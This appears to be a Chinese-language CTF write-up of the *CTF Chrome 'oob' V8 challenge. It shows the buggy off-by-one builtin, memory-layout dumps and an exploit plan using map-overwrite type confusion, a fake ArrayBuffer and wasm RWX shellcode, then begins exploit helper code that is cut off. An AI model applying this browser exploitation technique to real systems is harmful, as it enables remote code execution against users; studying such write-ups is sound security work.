      <content type="html"><![CDATA[<h1 id="star-ctf-chrome-oob-writeup"><a href="#star-ctf-chrome-oob-writeup" class="headerlink" title="star ctf chrome oob writeup"></a>star ctf chrome oob writeup</h1><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();<span class="comment">//check len&lt;=2,else return undefine</span></span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));----&gt;length off by one</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());----&gt;length off by one</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><p>可以看到在length这里有一个off-by-one</p><p>另外，这里有一个非预期的UAF，其实在Object::ToNumber(isolate, args.at<object>(1)))可以触发回调，通过valueof或者Symbol.toPrimitive可以在这里将array的length改成0之后强制GC将其回收掉，然后重新喷内存占位，由于我们之前缓存了length，可以一开始用一个非常大的length，而此时占位的array是我们可控的，可以占位一个length比较小的array，于是就可以任意OOB，而不是off by one。<br>类似的做法参考CVE-2017-5053，应该也是可以这么利用的，我没做太多尝试，有兴趣的同学可以试一下，不过显然这种做法会非常不稳定。</object></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>v8通过map来判断类型，通过off-by-one来修改map即可产生type confusion</p><h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><h3 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h3><p>通过splice控制array的内存排布紧邻。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> b = [&#123;&#125;, &#123;&#125;, ab, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//布局内存，让array连续存放</span></span><br><span class="line">a = a.splice(<span class="number">0</span>);</span><br><span class="line">b = b.splice(<span class="number">0</span>);</span><br><span class="line">c = c.splice(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>test如下：<br>可以看到如图所示的内存布局：<br>a elements的length位置存放的就是a obj的map了，于是a.oob(xxx)就可以将a的map给覆盖掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//0x33a1055ce0e1-&gt;0x33a1055ce0b1</span><br><span class="line">//0x33a1055ce139-&gt;0x33a1055ce101</span><br><span class="line">//0x33a1055ce191-&gt;0x33a1055ce159</span><br><span class="line"></span><br><span class="line">// x/60gx 0x33a1055ce0b1-1</span><br><span class="line">// 0x33a1055ce0b0: &#123;0x000033a10f4814f9 0x0000000400000000-&gt;a elements</span><br><span class="line">// 0x33a1055ce0c0: 0x3ff199999999999a 0x3ff199999999999a</span><br><span class="line">// 0x33a1055ce0d0: 0x3ff199999999999a 0x3ff199999999999a&#125;</span><br><span class="line">// 0x33a1055ce0e0: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;a obj</span><br><span class="line">// 0x33a1055ce0f0: 0x000033a1055ce0b1 0x0000000400000000&#125;</span><br><span class="line">// 0x33a1055ce100: &#123;0x000033a10f480801 0x0000000500000000-&gt;b elements</span><br><span class="line">// 0x33a1055ce110: 0x000033a1055cdfc9 0x000033a1055ce001</span><br><span class="line">// 0x33a1055ce120: 0x000033a1055cdf01 0x000033a12d09f3f9</span><br><span class="line">// 0x33a1055ce130: 0x000033a12d09f409&#125;</span><br><span class="line">//                                    &#123;0x000033a14e0c2f79-&gt;b obj</span><br><span class="line">// 0x33a1055ce140: 0x000033a10f480c71 0x000033a1055ce101</span><br><span class="line">// 0x33a1055ce150: 0x0000000500000000&#125;</span><br><span class="line">//                                    &#123;0x000033a10f4814f9-&gt;c elements</span><br><span class="line">// 0x33a1055ce160: 0x0000000500000000 0x400a666666666666</span><br><span class="line">// 0x33a1055ce170: 0x400a666666666666 0x400a666666666666</span><br><span class="line">// 0x33a1055ce180: 0x400a666666666666 0x400a666666666666&#125;</span><br><span class="line">// 0x33a1055ce190: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;c obj</span><br><span class="line">// 0x33a1055ce1a0: 0x000033a1055ce159 0x0000000500000000&#125;</span><br><span class="line">// 0x33a1055ce1b0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">// 0x33a1055ce1c0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">// 0x33a1055ce1d0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br></pre></td></tr></table></figure></p><h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>在要fake的arraybuffer的前后两次gc，使其内存分布更稳定。</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>调试的话，直接在对应版本的v8 release上调试，然后写到html里，放到chrome里就行了，偏移什么的都没有改变。<br>也可以直接gdb attach到chrome里调试。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>利用思路非常简单<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>我的exp写的比较dirty。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">String.prototype.padLeft =</span><br><span class="line">Number.prototype.padLeft = function(total, pad) &#123;</span><br><span class="line">  return (Array(total).join(pad || 0) + this).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return the hexadecimal representation of the given byte array.</span><br><span class="line">function hexlify(bytes) &#123;</span><br><span class="line">    var res = [];</span><br><span class="line">    for (var i = 0; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        //print(bytes[i].toString(16));</span><br><span class="line">        res.push((&apos;0&apos; + bytes[i].toString(16)).substr(-2));</span><br><span class="line">    &#125;</span><br><span class="line">    return res.join(&apos;&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return the binary data represented by the given hexdecimal string.</span><br><span class="line">function unhexlify(hexstr) &#123;</span><br><span class="line">    if (hexstr.length % 2 == 1)</span><br><span class="line">        throw new TypeError(&quot;Invalid hex string&quot;);</span><br><span class="line"></span><br><span class="line">    var bytes = new Uint8Array(hexstr.length / 2);</span><br><span class="line">    for (var i = 0; i &lt; hexstr.length; i += 2)</span><br><span class="line">        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);</span><br><span class="line"></span><br><span class="line">    return bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hexdump(data) &#123;</span><br><span class="line">    if (typeof data.BYTES_PER_ELEMENT !== &apos;undefined&apos;)</span><br><span class="line">        data = Array.from(data);</span><br><span class="line"></span><br><span class="line">    var lines = [];</span><br><span class="line">        var chunk = data.slice(i, i+16);</span><br><span class="line">    for (var i = 0; i &lt; data.length; i += 16) &#123;</span><br><span class="line">        var parts = chunk.map(hex);</span><br><span class="line">        if (parts.length &gt; 8)</span><br><span class="line">            parts.splice(8, 0, &apos; &apos;);</span><br><span class="line">        lines.push(parts.join(&apos; &apos;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return lines.join(&apos;\n&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simplified version of the similarly named python module.</span><br><span class="line">var Struct = (function() &#123;</span><br><span class="line">    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span><br><span class="line">    var buffer      = new ArrayBuffer(8);</span><br><span class="line">    var byteView    = new Uint8Array(buffer);</span><br><span class="line">    var uint32View  = new Uint32Array(buffer);</span><br><span class="line">    var float64View = new Float64Array(buffer);</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        pack: function(type, value) &#123;</span><br><span class="line">            var view = type;        // See below</span><br><span class="line">            view[0] = value;</span><br><span class="line">            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: function(type, bytes) &#123;</span><br><span class="line">            if (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                throw Error(&quot;Invalid bytearray&quot;);</span><br><span class="line"></span><br><span class="line">            var view = type;        // See below</span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            return view[0];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        // Available types.</span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">function Int64(v) &#123;</span><br><span class="line">    // The underlying byte array.</span><br><span class="line">    var bytes = new Uint8Array(8);</span><br><span class="line"></span><br><span class="line">    switch (typeof v) &#123;</span><br><span class="line">        case &apos;number&apos;:</span><br><span class="line">            v = &apos;0x&apos; + Math.floor(v).toString(16);</span><br><span class="line">        case &apos;string&apos;:</span><br><span class="line">            if (v.startsWith(&apos;0x&apos;))</span><br><span class="line">                v = v.substr(2);</span><br><span class="line">            if (v.length % 2 == 1)</span><br><span class="line">                v = &apos;0&apos; + v;</span><br><span class="line"></span><br><span class="line">            var bigEndian = unhexlify(v, 8);</span><br><span class="line">            //print(bigEndian.toString());</span><br><span class="line">            bytes.set(Array.from(bigEndian).reverse());</span><br><span class="line">            break;</span><br><span class="line">        case &apos;object&apos;:</span><br><span class="line">            if (v instanceof Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (v.length != 8)</span><br><span class="line">                    throw TypeError(&quot;Array must have excactly 8 elements.&quot;);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case &apos;undefined&apos;:</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            throw TypeError(&quot;Int64 constructor requires an argument.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Return a double whith the same underlying bit representation.</span><br><span class="line">    this.asDouble = function() &#123;</span><br><span class="line">        // Check for NaN</span><br><span class="line">        if (bytes[7] == 0xff &amp;&amp; (bytes[6] == 0xff || bytes[6] == 0xfe))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a double&quot;);</span><br><span class="line"></span><br><span class="line">        return Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return a javascript value with the same underlying bit representation.</span><br><span class="line">    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span><br><span class="line">    // due to double conversion constraints.</span><br><span class="line">    this.asJSValue = function() &#123;</span><br><span class="line">        if ((bytes[7] == 0 &amp;&amp; bytes[6] == 0) || (bytes[7] == 0xff &amp;&amp; bytes[6] == 0xff))</span><br><span class="line">            throw new RangeError(&quot;Integer can not be represented by a JSValue&quot;);</span><br><span class="line"></span><br><span class="line">        // For NaN-boxing, JSC adds 2^48 to a double value&apos;s bit pattern.</span><br><span class="line">        this.assignSub(this, 0x1000000000000);</span><br><span class="line">        var res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        this.assignAdd(this, 0x1000000000000);</span><br><span class="line"></span><br><span class="line">        return res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the underlying bytes of this number as array.</span><br><span class="line">    this.bytes = function() &#123;</span><br><span class="line">        return Array.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the byte at the given index.</span><br><span class="line">    this.byteAt = function(i) &#123;</span><br><span class="line">        return bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Return the value of this number as unsigned hex string.</span><br><span class="line">    this.toString = function() &#123;</span><br><span class="line">        //print(&quot;toString&quot;);</span><br><span class="line">        return &apos;0x&apos; + hexlify(Array.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Basic arithmetic.</span><br><span class="line">    // These functions assign the result of the computation to their &apos;this&apos; object.</span><br><span class="line"></span><br><span class="line">    // Decorator for Int64 instance operations. Takes care</span><br><span class="line">    // of converting arguments to Int64 instances if required.</span><br><span class="line">    function operation(f, nargs) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">            if (arguments.length != nargs)</span><br><span class="line">                throw Error(&quot;Not enough arguments for function &quot; + f.name);</span><br><span class="line">            for (var i = 0; i &lt; arguments.length; i++)</span><br><span class="line">                if (!(arguments[i] instanceof Int64))</span><br><span class="line">                    arguments[i] = new Int64(arguments[i]);</span><br><span class="line">            return f.apply(this, arguments);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this = -n (two&apos;s complement)</span><br><span class="line">    this.assignNeg = operation(function neg(n) &#123;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        return this.assignAdd(this, Int64.One);</span><br><span class="line">    &#125;, 1);</span><br><span class="line"></span><br><span class="line">    // this = a + b</span><br><span class="line">    this.assignAdd = operation(function add(a, b) &#123;</span><br><span class="line">        var carry = 0;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; 0xff | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    // this = a - b</span><br><span class="line">    this.assignSub = operation(function sub(a, b) &#123;</span><br><span class="line">        var carry = 0;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            var cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; 0 | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line">    // this = a &amp; b</span><br><span class="line">    this.assignAnd = operation(function and(a, b) &#123;</span><br><span class="line">        for (var i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Constructs a new Int64 instance with the same bit representation as the provided double.</span><br><span class="line">Int64.fromDouble = function(d) &#123;</span><br><span class="line">    var bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    return new Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// Convenience functions. These allocate a new Int64 to hold the result.</span><br><span class="line"></span><br><span class="line">// Return -n (two&apos;s complement)</span><br><span class="line">function Neg(n) &#123;</span><br><span class="line">    return (new Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a + b</span><br><span class="line">function Add(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a - b</span><br><span class="line">function Sub(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return a &amp; b</span><br><span class="line">function And(a, b) &#123;</span><br><span class="line">    return (new Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hex(a) &#123;</span><br><span class="line">    if (a == undefined) return &quot;0xUNDEFINED&quot;;</span><br><span class="line">    var ret = a.toString(16);</span><br><span class="line">    if (ret.substr(0,2) != &quot;0x&quot;) return &quot;0x&quot;+ret;</span><br><span class="line">    else return 